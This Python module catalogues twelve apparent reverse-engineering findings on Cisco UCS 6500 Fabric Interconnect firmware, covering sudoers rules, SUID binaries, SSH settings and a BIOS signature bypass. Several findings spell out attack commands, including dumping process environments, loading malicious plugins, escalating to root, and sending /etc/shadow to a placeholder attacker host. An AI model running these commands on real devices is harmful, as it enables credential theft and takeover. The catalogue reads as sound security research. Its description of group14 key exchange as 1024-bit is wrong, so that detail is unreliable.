"""
Cisco UCS 6500 Series Fabric Interconnect Infrastructure Bundle 6.0(2b)A — RE Module
Source: ucs-6500-k9-bundle-infra.6.0.2b.A.bin (/media/cowboy/research/Cisco-UCS/)
Bundle format: Cisco proprietary header (808 bytes) + gzip-compressed tar
Tar content: ./isan/plugin_img/ucsfi.10.5.1.I60.2b.F.bin (99MB, mknbi-linux-1.2-6)
FI image structure: netboot header + ELF kernel (gzip@0x3FB1) + NX-OS CPIO initramfs (gzip@0x8EE800)
"""

FIRMWARE = {
    "target":     "Cisco UCS 6500 Series Fabric Interconnect",
    "version":    "6.0(2b)A",
    "source":     "ucs-6500-k9-bundle-infra.6.0.2b.A.bin",
    "bundle_hdr": "808-byte proprietary header (magic: 6401534e), filename + version metadata",
    "payload":    "ucsfi.10.5.1.I60.2b.F.bin (mknbi-linux-1.2-6 format)",
    "os_base":    "NX-OS / ISAN, x86-64, CPIO initramfs + DNF/RPM package bootstrap",
    "key_rpms":   "nginx-1.25.4, pam-plugin-debug-1.3.0, python3-debugger-3.8.20",
    "findings":   ["FI6500-F1", "FI6500-F2", "FI6500-F3", "FI6500-F4",
                   "FI6500-F5", "FI6500-F6", "FI6500-F7", "FI6500-F8",
                   "FI6500-F9", "FI6500-F10", "FI6500-F11", "FI6500-F12"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F1: sudoers NOPASSWD /usr/bin/strings /proc/*/environ
#            — any authenticated user can dump env vars of all processes
# ─────────────────────────────────────────────────────────
FI6500_F1 = {
    "id":       "FI6500-F1",
    "title":    "NX-OS FI sudoers grants NOPASSWD 'strings /proc/*/environ' to all authenticated users — "
                "any non-admin session can read environment variables of every process including root-owned daemons",
    "status":   "CONFIRMED — /etc/sudoers in CPIO initramfs of ucsfi.10.5.1.I60.2b.F.bin",
    "severity": "HIGH",

    "sudoers_entry": (
        "Cmnd_Alias COUNT_VSH_SH_CMNDS = /usr/bin/strings /proc/*/environ\n"
        "ALL,!root,!admin ALL = NOPASSWD:COUNT_VSH_SH_CMNDS"
    ),

    "impact": (
        "Any authenticated NX-OS user who escalates to the Linux host layer "
        "(via vsh_perm shell, SSH, or any other code execution path) can run:\n"
        "  sudo /usr/bin/strings /proc/*/environ\n"
        "This dumps the environment of every running process on the system. "
        "NX-OS daemons, management plane processes, and cloud connector agents "
        "may store session tokens, SNMP secrets, cluster keys, or Intersight credentials "
        "in environment variables. No password required; no restriction on process scope."
    ),

    "cisco_bug": "CSCwm11251 — 'multiple FI host sudo root escalations' (referenced in sudoers comment above BCM shell rule)",

    "note": (
        "This rule is labeled in the sudoers comment block as a fix for CSCwm11251. "
        "Cisco removed the bcm-shell NOPASSWD rule as a known escalation vector, "
        "but COUNT_VSH_SH_CMNDS was retained. The original bcm-shell rule was:\n"
        "  /usr/bin/ssh -l root -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "
        "-q lc[0-9]* /lc/isan/bcm/bcm-shell\n"
        "Retained NOPASSWD rules with escalation potential include strings /proc/*/environ, "
        "loadplugin, and mknbi-insieme."
    ),
}

# ─────────────────────────────────────────────────────────
# FI6500-F2: NOPASSWD loadplugin from bootflash/volatile/slot
#            — any authenticated user can load arbitrary NX-OS plugins
# ─────────────────────────────────────────────────────────
FI6500_F2 = {
    "id":       "FI6500-F2",
    "title":    "NX-OS FI sudoers grants NOPASSWD loadplugin from bootflash/volatile/slot storage to all "
                "authenticated users — if bootflash is writable, arbitrary NX-OS plugin load achievable",
    "status":   "CONFIRMED — /etc/sudoers LOADPLUGIN_CMNDS in ucsfi.10.5.1.I60.2b.F.bin",
    "severity": "HIGH",

    "sudoers_entry": (
        "Cmnd_Alias LOADPLUGIN_CMNDS = \\\n"
        "    /isan/sbin/loadplugin /bootflash/*, \\\n"
        "    /isan/sbin/loadplugin /volatile/*, \\\n"
        "    /isan/sbin/loadplugin /slot[0-9]/*, \\\n"
        "    /isanboot/sbin/loadplugin /bootflash/*, \\\n"
        "    /isanboot/sbin/loadplugin /volatile/*, \\\n"
        "    /isanboot/sbin/loadplugin /slot[0-9]/*\n"
        "ALL,!root,!admin ALL = NOPASSWD:LOADPLUGIN_CMNDS"
    ),

    "impact": (
        "loadplugin installs and activates NX-OS plugin packages. "
        "Any non-admin authenticated user can load a plugin from bootflash or volatile storage "
        "without a password. Attack path:\n"
        "  1. Gain any authenticated NX-OS session\n"
        "  2. Transfer a malicious plugin .bin to bootflash (via copy, scp, or any write path)\n"
        "  3. sudo /isan/sbin/loadplugin /bootflash/<malicious>.bin\n"
        "  4. Plugin executes within the NX-OS service plane at elevated privilege\n"
        "The wildcard on /volatile/* is broader — volatile storage is an in-memory tmpfs "
        "writable by any process, so no bootflash write access is required for the volatile path."
    ),

    "volatile_path_note": (
        "/volatile/* is in-memory tmpfs. Any process that can write to /volatile can "
        "drop a plugin file and load it via NOPASSWD loadplugin. "
        "This collapses the attack chain: code-exec-as-any-user → plugin-load → "
        "NX-OS service plane execution."
    ),
}

# ─────────────────────────────────────────────────────────
# FI6500-F3: admin and %network-admin have NOPASSWD:ALL sudo
#            — any admin credential compromise = unrestricted root
# ─────────────────────────────────────────────────────────
FI6500_F3 = {
    "id":       "FI6500-F3",
    "title":    "NX-OS FI sudoers grants NOPASSWD:ALL to admin user and network-admin group — "
                "credential compromise of either escalates directly to unrestricted root",
    "status":   "CONFIRMED — /etc/sudoers in ucsfi.10.5.1.I60.2b.F.bin",
    "severity": "MEDIUM",

    "sudoers_entries": [
        "root ALL = (ALL) NOPASSWD:ALL",
        "admin ALL = (ALL) NOPASSWD:ALL",
        "%network-admin ALL = (ALL) NOPASSWD:ALL",
    ],

    "account_model": (
        "The NX-OS admin account (/etc/passwd: admin:x:2002:503::/var/home/admin:/isan/bin/vsh_perm) "
        "uses NX-OS vsh_perm as its shell — authentication goes through libpam_aaa_auth.so. "
        "When the admin session drops to the host Linux layer (e.g., via 'run bash' or debug access), "
        "admin ALL = (ALL) NOPASSWD:ALL provides direct root escalation. "
        "The network-admin group broadens this to any NX-OS network-admin role member."
    ),

    "attack_path": (
        "NX-OS network-admin login → run bash (or any Linux shell access) → "
        "sudo su or sudo bash → unrestricted root on the FI host. "
        "No password prompt at any step post-authentication."
    ),
}

# ─────────────────────────────────────────────────────────
# FI6500-F4: Debug packages (pam-plugin-debug, python3-debugger) in production firmware
# ─────────────────────────────────────────────────────────
FI6500_F4 = {
    "id":       "FI6500-F4",
    "title":    "Debug packages pam-plugin-debug-1.3.0 and python3-debugger-3.8.20 shipped in production "
                "UCS 6500 FI 6.0(2b)A firmware — expands debug attack surface on production infrastructure",
    "status":   "CONFIRMED — DNF yumdb entries in CPIO initramfs: pam-plugin-debug and python3-debugger installed",
    "severity": "LOW",

    "installed_debug_packages": [
        "pam-plugin-debug-1.3.0-r5-corei7_64 (SHA: 506f4d9a6cdb0f7de49817d36d88826fec289d38)",
        "python3-debugger-3.8.20-r0-corei7_64 (SHA: 40f4a431709f5656b43f0bfe2bf1764aa15b731a)",
    ],

    "pam_debug_impact": (
        "pam-plugin-debug provides PAM module debugging capability. "
        "In production, this can be configured (via PAM stack editing) to log authentication tokens, "
        "debug auth decisions, or bypass auth checks during troubleshooting. "
        "Its presence means the attack surface includes PAM debug interfaces "
        "that would not exist in a hardened production image."
    ),

    "python_debugger_impact": (
        "python3-debugger (pdb and related modules) is installed alongside the production Python 3.8. "
        "An attacker with any Python execution path can invoke pdb to attach to running Python processes, "
        "inspect their memory, and modify execution — without needing gdb or external debugging tools."
    ),
}

# Account summary from /etc/passwd + /etc/shadow
ACCOUNTS = {
    "root":         {"uid": 0,    "shell": "/bin/bash",           "shadow": "requires password"},
    "ftp":          {"uid": 15,   "shell": "/isanboot/bin/nobash", "shadow": "*"},
    "sshd":         {"uid": 17,   "shell": "/isanboot/bin/nobash", "shadow": "*"},
    "admin":        {"uid": 2002, "shell": "/isan/bin/vsh_perm",   "shadow": "!:12498:0:99999:7 (NX-OS managed)"},
    "adminbackup":  {"uid": None, "shell": None,                   "shadow": "!:13419:0:99999:7 (no expiry)"},
    "svc-nxapi":    {"uid": 498,  "shell": "/isan/bin/vsh_perm",   "shadow": "*"},
    "svc-nxsdk":    {"uid": 500,  "shell": "/isan/bin/vsh_perm",   "sudo": "NOPASSWD:/isan/bin/vsh"},
    "svc-nxcloud":  {"uid": 501,  "shell": "/isan/bin/vsh_perm",   "sudo": "NOPASSWD:/isan/bin/vsh"},
}

# ─────────────────────────────────────────────────────────
# FI6500-F5 — dcos_sshd_config StrictModes no — world-writable authorized_keys accepted
# ─────────────────────────────────────────────────────────
FI6500_F5 = {
    "id":       "FI6500-F5",
    "title":    "NX-OS production SSH (dcos_sshd_config) sets StrictModes no — insecure authorized_keys file permissions are not enforced; world-writable keys accepted",
    "status":   "CONFIRMED — /isan/etc/dcos_sshd_config in FI6400/6500/6600 NX-OS rootfs",
    "severity": "MEDIUM",

    "config_file": "isan/etc/dcos_sshd_config",
    "directive":   "StrictModes no",

    "impact": (
        "With StrictModes no, OpenSSH does not check that the user's home directory and "
        "authorized_keys file are owned by the user or have safe permissions. "
        "If an attacker can write to /root/.ssh/authorized_keys (e.g., via the NOPASSWD chown "
        "finding in UCSC or any writable path to that directory), sshd will accept the injected "
        "key even if the file is world-writable. On a system with multiple NOPASSWD sudo rules "
        "(FI6500-F1 through F3), StrictModes no removes the last permission-based gate on "
        "key-based root access."
    ),

    "contrast": (
        "The internal non-production sshd_config (isan/etc/sshd_config) sets StrictModes yes. "
        "Production and debug configurations have inverted StrictModes settings."
    ),

    "applies_to": ["FI 6400 (FI64XX-F1 — identical binary)", "FI 6500", "FI 6600 (FI64XX-F1 — identical binary)"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F6 — xmlsa hardcoded sudo reboot sequence — NETCONF/xmlagent triggers FI host reboot
# ─────────────────────────────────────────────────────────
FI6500_F6 = {
    "id":       "FI6500-F6",
    "title":    "xmlsa (NETCONF + xmlagent SSH subsystem) contains hardcoded sudo reboot sequence — authenticated NETCONF 'reload' command triggers FI host reboot as root",
    "status":   "CONFIRMED — strings /isan/bin/xmlsa in FI6400/6500/6600 NX-OS rootfs",
    "severity": "MEDIUM",

    "binary":  "isan/bin/xmlsa (ELF x86-64, stripped)",
    "subsystems": [
        "Subsystem xmlagent /isan/bin/xmlsa  (in dcos_sshd_config and sshd_config)",
        "Subsystem netconf  /isan/bin/xmlsa  (in dcos_sshd_config)",
    ],

    "hardcoded_commands": [
        "/usr/bin/sudo /usr/bin/killall incrond",
        "/usr/bin/sudo /usr/bin/timeout 45s /bin/bash -c '/opt/stop-ucsm-container.sh reload > /bootflash/sysdebug/reload.txt 2>&1'",
        "/usr/bin/sudo /usr/bin/timeout 5s /bin/umount -a -d -f -r -tnoproc,noprocfs,nosysfs,nodevpts,nodevfs  >> /bootflash/sysdebug/reload.txt 2>&1",
        "/usr/bin/sudo /sbin/reboot -d -f",
    ],

    "impact": (
        "Any SSH session authenticated as a user with NETCONF or xmlagent subsystem access can "
        "trigger a full FI host reboot by issuing a NETCONF 'reload' RPC or XML reload command. "
        "The reload sequence: kills incrond, calls stop-ucsm-container.sh (container teardown), "
        "force-unmounts all filesystems, then executes /sbin/reboot -d -f. "
        "This is a persistent availability impact: an authenticated attacker can force reboot "
        "the FI at any time, interrupting all fabric traffic and management operations."
    ),

    "ucsm_container_script": (
        "/opt/stop-ucsm-container.sh is passed 'reload' as argument. "
        "If this script has a command injection path in its argument handling, "
        "xmlsa's hardcoded sudo call becomes a local command injection vector "
        "for any user who can trigger the reload path."
    ),

    "applies_to": ["FI 6400 (FI64XX-F1 — identical binary)", "FI 6500", "FI 6600 (FI64XX-F1 — identical binary)"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F7 — internal ISAN sshd_config PermitRootLogin yes with LoginGraceTime 600
# ─────────────────────────────────────────────────────────
FI6500_F7 = {
    "id":       "FI6500-F7",
    "title":    "Internal ISAN sshd_config sets PermitRootLogin yes, PasswordAuthentication yes, LogLevel DEBUG3, LoginGraceTime 600 — root SSH login via password enabled; 10-minute auth window",
    "status":   "CONFIRMED — /isan/etc/sshd_config in FI6400/6500/6600 NX-OS rootfs",
    "severity": "MEDIUM",

    "config_file": "isan/etc/sshd_config",
    "key_directives": {
        "PermitRootLogin":    "yes — explicit root login enabled",
        "PasswordAuthentication": "yes — password auth enabled for root",
        "LogLevel":           "DEBUG3 — verbose logging exposes auth attempts, session keys",
        "LoginGraceTime":     "600 — 10-minute window per connection for authentication",
        "StrictModes":        "yes — file permission checks enforced",
    },

    "note": (
        "The internal sshd (isan/sbin/sshd) uses this config. "
        "Whether it is exposed on the management interface or only localhost is runtime-dependent. "
        "The production SSH daemon (isan/sbin/dcos_sshd + isan/etc/dcos_sshd_config) sets "
        "PermitRootLogin no. The DEBUG3 log level is the most significant standalone element: "
        "detailed session negotiation data, keys exchanged, and auth decisions are logged to syslog, "
        "creating a credential exposure path via log aggregation."
    ),

    "applies_to": ["FI 6400 (FI64XX-F1 — identical binary)", "FI 6500", "FI 6600 (FI64XX-F1 — identical binary)"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F8 — NOPASSWD sam-copy.sh wildcard — arbitrary file exfiltration/import via SCP/FTP/TFTP
# ─────────────────────────────────────────────────────────
FI6500_F8 = {
    "id":       "FI6500-F8",
    "title":    "sudoers NOPASSWD for /isan/bin/sam-copy.sh with wildcard args in management netns — any authenticated user can exfiltrate or overwrite arbitrary FI files via SCP/SFTP/FTP/TFTP",
    "status":   "CONFIRMED — /etc/sudoers + /isan/bin/sam-copy.sh in FI6400 NX-OS rootfs (applies to FI6400/6500/6600)",
    "severity": "HIGH",

    "sudoers_entry": (
        "Cmnd_Alias INITIAL_SETUP_GUI_CMNDS = \\\n"
        "    ...,\n"
        "    /sbin/ip netns exec management /isan/bin/sam-copy.sh *\n"
        "ALL,!root,!admin ALL = NOPASSWD:...,NOPASSWD:INITIAL_SETUP_GUI_CMNDS"
    ),

    "sam_copy_usage": (
        "sam-copy.sh <protocol> <copyout|copyin> <server> <localfile> <remotefile> <user> [<passwd>]\n"
        "Protocols: scp, sftp, ftp, tftp\n"
        "Implemented as an Expect script wrapping scp/sftp/ftp/busyboxsam tftp.\n"
        "localfile and remotefile accept arbitrary paths."
    ),

    "exfiltration_example": (
        "sudo /sbin/ip netns exec management /isan/bin/sam-copy.sh scp copyout "
        "<attacker_ip> /etc/shadow /tmp/shadow admin <pass>\n"
        "Copies /etc/shadow to attacker-controlled server via SCP from the management network namespace. "
        "The password is a required positional arg (argv[6]) and visible in process table — "
        "combined with FI6500-F1 (NOPASSWD strings /proc/*/environ), "
        "the password is also readable from the sam-copy.sh process environment."
    ),

    "import_example": (
        "sudo /sbin/ip netns exec management /isan/bin/sam-copy.sh scp copyin "
        "<attacker_ip> /etc/sudoers /tmp/sudoers_evil admin <pass>\n"
        "If /etc/sudoers is writable after import, or if any other config file "
        "under /isan/, /etc/, or /opt/ is writable, arbitrary content can be injected."
    ),

    "scope": "Any authenticated NX-OS user with access to the host Linux layer. No admin or root required.",
    "applies_to": ["FI 6400 (confirmed)", "FI 6500 (FI64XX-F1 — identical binary)", "FI 6600 (FI64XX-F1)"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F9: bios_daemon skips digital signature verification when BIOS version
#            comparison fails — malformed version string bypasses signature check
# ─────────────────────────────────────────────────────────
FI6500_F9 = {
    "id":       "FI6500-F9",
    "title":    "bios_daemon in FI NX-OS ISAN skips BIOS digital signature verification when "
                "compare_bios_version() fails — version string comparison error triggers unconditional "
                "signature bypass for FI hardware BIOS update",
    "status":   "CONFIRMED — strings from bios_daemon ELF in fi6400-isan-sq/bin/ "
                "(applies to FI 6400/6500/6600 via FI64XX-F1 identical binary)",
    "severity": "HIGH",

    "binary":   "/isan/bin/bios_daemon (x86-64 ELF, stripped)",

    "bypass_condition": {
        "trigger":      "compare_bios_version() returns non-zero errno",
        "log_message":  "Skip signature verification on old bios",
        "log_format":   "Bios version comparison failed, errno %d",
        "consequence":  "bios_verify_digital_signature_img or bios_verify_digital_signature_img_with_biosid "
                        "skipped for the BIOS image being installed on the FI hardware",
    },

    "mts_opcode": "MTS_OPC_BIOS_VERIFY_DIGITAL_SIGNATURE — received via ISAN MTS message bus",

    "version_comparison_functions": [
        "compare_bios_version",
        "common_compare_bios_versions",
        "std_version_compare_func",
        "alt_version_compare_func",
    ],

    "bios_images_on_fi": [
        "bios-red-dog.bin.gz",
        "bios-serpens-x86s-tor.bin.gz",
        "bios-starduskG.bin.gz",
        "bios-x86s-chimay.bin.gz",
        "bios-x86s-skagit-river.bin.gz",
        "psu_fw.bin.gz",
    ],

    "keystone": {
        "path_tmp":   "/tmp/keystone.bin",
        "path_isan":  "/isan/bin/bios_imgs/keystone.bin.gz",
        "note":       "bios_daemon extracts keystone.bin from isan/bin/bios_imgs/ to /tmp/ at runtime; "
                      "purpose TBD (cryptographic primitive or FI platform-specific boot key material)",
    },

    "impact": (
        "bios_daemon is responsible for verifying and installing FI hardware BIOS updates "
        "in response to MTS messages (MTS_OPC_BIOS_VERIFY_DIGITAL_SIGNATURE). "
        "When compare_bios_version() returns an error (malformed version string in image header "
        "or race condition in version retrieval), the daemon logs 'Skip signature verification on old bios' "
        "and proceeds without calling bios_verify_digital_signature_img. "
        "An attacker who can inject a BIOS update with a malformed version field into the FI update pipeline "
        "bypasses signature verification and installs unsigned BIOS on the FI hardware — "
        "the central management plane of the entire UCS domain. "
        "FI BIOS persistence survives OS reinstallation and host-side detection."
    ),

    "applies_to": [
        "FI 6400 (confirmed — extracted from fi6400-isan-sq/bin/bios_daemon)",
        "FI 6500 (FI64XX-F1 — identical NX-OS binary sha256:720fc65d...)",
        "FI 6600 (FI64XX-F1 — identical NX-OS binary sha256:720fc65d...)",
    ],
}

# ─────────────────────────────────────────────────────────
# FI6500-F10: SUID cmosio — unprivileged CMOS dump and factory reset
# Source: fi6400-extract/rootfs/isanboot/bin/cmosio (x86-64 ELF, SUID root)
# ─────────────────────────────────────────────────────────
FI6500_F10 = {
    "id":       "FI6500-F10",
    "title":    "NX-OS FI /isanboot/bin/cmosio ships SUID root — any authenticated user "
                "can dump CMOS content (-d), reset CMOS to factory defaults (-R), or "
                "change boot mode (-w bootmode g|p|p2g|g2p) without elevated privileges",
    "status":   "CONFIRMED — cmosio ELF in fi6400 rootfs (SUID 4755); source build tag "
                "@@TGT@@ucs/x86_64/final/cmosio/supe-boot/cmosio.bin; /dev/cmos opened directly",
    "severity": "HIGH",

    "binary_path":  "/isanboot/bin/cmosio",
    "file_mode":    "SUID 4755 (root owner)",
    "device_path":  "/dev/cmos",
    "operations": {
        "-d":                      "Dump full CMOS RAM contents to stdout",
        "-R":                      "Reset CMOS to factory defaults on next reboot — clears boot config",
        "-w bootmode g|p|p2g|g2p": "Change supervisor boot mode (gold/provisioned image selection)",
        "-w ip|mask|gw <addr>":    "Write IP/netmask/gateway to CMOS (management network override)",
        "-w server <addr>":        "Write TFTP/boot server address to CMOS",
        "write-offset / read-offset": "Direct CMOS byte read/write by offset",
    },
    "impact": (
        "Any user with a shell on the FI (e.g., via a prior finding) can: (1) dump CMOS "
        "RAM to extract boot configuration and any stored network credentials; "
        "(2) trigger factory reset via CMOS clearing, reverting the FI to default config "
        "on next reboot and breaking production connectivity; (3) switch supervisor to gold "
        "image bypassing provisioned NX-OS image. The -w bootmode p2g switch causes the "
        "supervisor to boot the gold/recovery image, bypassing any hardened provisioned image."
    ),
    "applies_to": ["FI 6400", "FI 6500 (FI64XX-F1)", "FI 6600 (FI64XX-F1)"],
    "tags":      ["suid", "hardware-access", "cmos", "dos", "cwe-276", "high"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F11: SUID security_hash_type.py — PAM password hash algorithm downgrade
# Source: fi6400-extract/rootfs/isan/python3/scripts/security_hash_type.py (SUID root)
# ─────────────────────────────────────────────────────────
FI6500_F11 = {
    "id":       "FI6500-F11",
    "title":    "NX-OS FI /isan/python3/scripts/security_hash_type.py ships SUID root — "
                "any authenticated user can downgrade the FI password hash algorithm from "
                "scrypt to SHA-256 by passing -type sha256 without elevated privileges",
    "status":   "CONFIRMED — security_hash_type.py in fi6400 rootfs with SUID 4755; "
                "modifies /etc/pam.d/passwd inline; accepts -type {scrypt|pbkdf2|sha256}",
    "severity": "MEDIUM",

    "script_path":  "/isan/python3/scripts/security_hash_type.py",
    "file_mode":    "SUID 4755 (root owner)",
    "pam_file":     "/etc/pam.d/passwd",
    "shadow_file":  "/etc/shadow",
    "opasswd_file": "/etc/security/nxos_opasswd",
    "operations": {
        "-type sha256":        "Downgrades pam_unix hash algorithm from scrypt/pbkdf2 to SHA-256",
        "-type scrypt":        "Upgrades hash algorithm to scrypt (correct; the safe direction)",
        "PAM -pwhistory 1":    "Enables password history enforcement",
        "PAM_CREATE -pwhistory_create <user> -passwd_hash <hash>": (
            "Creates shadow entry for user with supplied hash if not in opasswd; "
            "writes to /etc/shadow when user not found in opasswd"
        ),
    },
    "impact": (
        "Any user with a shell can run `security_hash_type.py -type sha256` to downgrade the "
        "FI's PAM password hashing from scrypt to SHA-256. SHA-256 crypt hashes are "
        "significantly faster to crack than scrypt. After downgrade, newly set passwords use "
        "SHA-256; existing scrypt hashes remain but new admin password resets are weaker. "
        "The PAM_CREATE operation with an attacker-supplied hash can also write a shadow "
        "entry with a known-cleartext password to /etc/shadow."
    ),
    "applies_to": ["FI 6400", "FI 6500 (FI64XX-F1)", "FI 6600 (FI64XX-F1)"],
    "tags":      ["suid", "pam", "hash-downgrade", "cwe-916", "medium"],
}

# ─────────────────────────────────────────────────────────
# FI6500-F12: SUID isan_etc_dcos_sshd.py — SSH cipher/kex downgrade
# Source: fi6400-extract/rootfs/isan/python3/scripts/isan_etc_dcos_sshd.py (SUID root)
# ─────────────────────────────────────────────────────────
FI6500_F12 = {
    "id":       "FI6500-F12",
    "title":    "NX-OS FI /isan/python3/scripts/isan_etc_dcos_sshd.py ships SUID root — "
                "any authenticated user can configure FI SSH daemon to weak ciphers, MACs, "
                "or kex algorithms including CBC-mode ciphers, SHA-1 MACs, and DH-group14-sha1",
    "status":   "CONFIRMED — isan_etc_dcos_sshd.py in fi6400 rootfs with SUID 4755; "
                "writes to /isan/etc/dcos_sshd_config* via glob; weak cipher set documented in script",
    "severity": "MEDIUM",

    "script_path":  "/isan/python3/scripts/isan_etc_dcos_sshd.py",
    "file_mode":    "SUID 4755 (root owner)",
    "config_target": "glob /isan/etc/dcos_sshd_config* (all VDC configs)",
    "weak_ciphers": [
        "aes128-cbc", "aes192-cbc", "aes256-cbc",
    ],
    "weak_kex": [
        "diffie-hellman-group14-sha1",
    ],
    "weak_macs": [
        "hmac-sha1", "hmac-sha1-etm@openssh.com",
    ],
    "note": "STRONG mode also includes diffie-hellman-group14-sha1 — both weak and strong "
            "SSH profiles retain SHA-1-based Diffie-Hellman key exchange",
    "impact": (
        "Any user with a shell can invoke the SUID script to switch all FI SSH daemon configs "
        "to the weak cipher profile, enabling CBC-mode ciphers (BEAST/POODLE-class attacks) "
        "and SHA-1 MACs on all subsequent SSH sessions. The STRONG cipher profile does not "
        "remove diffie-hellman-group14-sha1 — DH-1024/SHA-1 remains available in all modes. "
        "This affects all VDC configs simultaneously via the glob pattern."
    ),
    "applies_to": ["FI 6400", "FI 6500 (FI64XX-F1)", "FI 6600 (FI64XX-F1)"],
    "tags":      ["suid", "ssh", "weak-crypto", "cwe-326", "medium"],
}

FINDINGS = [FI6500_F1, FI6500_F2, FI6500_F3, FI6500_F4, FI6500_F5,
            FI6500_F6, FI6500_F7, FI6500_F8, FI6500_F9,
            FI6500_F10, FI6500_F11, FI6500_F12]

if __name__ == "__main__":
    for f in FINDINGS:
        print(f"[{f['severity']:8s}] {f['id']}: {f['title'][:80]}")
